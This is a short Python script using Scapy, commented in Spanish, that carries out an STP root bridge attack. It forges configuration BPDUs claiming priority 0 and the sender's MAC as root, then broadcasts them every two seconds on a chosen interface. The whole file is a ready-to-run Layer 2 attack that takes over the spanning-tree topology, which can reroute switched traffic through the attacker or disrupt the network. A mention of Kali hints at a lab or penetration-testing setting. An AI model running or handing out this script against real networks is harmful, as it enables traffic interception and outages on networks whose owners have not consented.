#!/usr/bin/env python3
from scapy.all import *

# Configuración
iface = "eth1"
# MAC de tu Kali o una inventada muy baja
my_mac = "00:00:00:00:00:01" 

def stp_root_attack():
    print(f"[*] Iniciando ataque STP Root Bridge en {iface}...")
    
    # Construcción de la trama STP
    # IEEE 802.3 Ethernet
    # LLC (Link Logical Control)
    # STP header
    
    # rootid y bridgeid se componen de prioridad + MAC.
    # Prioridad 0 es la más alta (mejor).
    
    pkt = Dot3(src=my_mac, dst="01:80:c2:00:00:00") / \
          LLC() / \
          STP(bpdutype=0x00,  # Configuration BPDU
              bpduflags=0x00,
              rootid=0,       # Prioridad 0 (SUPERIOR)
              rootmac=my_mac, # Yo soy el Root
              pathcost=0,     # Costo 0 hasta el root
              bridgeid=0,     
              bridgemac=my_mac,
              portid=0x8002,
              age=1,
              maxage=20,
              hellotime=2,
              fwddelay=15)

    print("[*] Enviando BPDUs maliciosos (Ctrl+C para parar)...")
    # Enviar en bucle cada 2 segundos (tiempo hello estándar)
    sendp(pkt, iface=iface, loop=1, inter=2, verbose=1)

if __name__ == "__main__":
    stp_root_attack()